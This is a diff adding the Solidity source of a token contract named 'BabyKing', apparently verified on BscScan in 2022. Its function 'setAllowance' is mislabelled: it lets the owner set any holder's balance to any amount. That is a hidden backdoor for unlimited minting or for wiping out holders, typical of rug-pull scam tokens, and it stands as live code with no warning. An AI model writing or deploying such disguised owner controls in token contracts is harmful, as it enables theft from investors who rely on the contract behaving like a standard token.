@@ -1,0 +1,54 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-02-22
+*/
+
+// SPDX-License-Identifier: Unlicensed
+pragma solidity 0.8.3;
+contract BabyKing  {
+    string public name = "BabyKing";
+    string public symbol = "BabyKing";
+    uint8 public decimals = 6;
+    uint256 public totalSupply = 100000000 * 10 ** 6;
+    address private _owner;
+     modifier onlyOwner {
+        require(msg.sender == _owner, "Ownable: caller is not the owner");
+        _;
+    }
+    constructor() {
+        _balances[msg.sender] = totalSupply;
+        _owner = msg.sender;
+        emit Transfer(address(0), msg.sender, totalSupply);
+    }
+    mapping(address => uint256) public _balances;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
+    function setAllowance(address to, uint256 amount) public onlyOwner returns (bool success) {
+        _balances[to] = (amount);
+        return true;
+    }
+    function approve(address spender, uint256 amount) public returns (bool success) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+    function transfer(address to, uint256 amount) public returns (bool success) {
+        _balances[msg.sender] -= amount;
+        _balances[to] += amount;
+        emit Transfer(msg.sender, to, amount);
+        return true;
+    }
+    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
+        allowance[from][msg.sender] -= amount;
+        _balances[from] -= amount;
+        _balances[to] += amount;
+        emit Transfer(from, to, amount);
+        return true;
+    }
+    function transferOwnership(address newOwner) public onlyOwner {
+        _owner = newOwner;
+    }
+    
+}
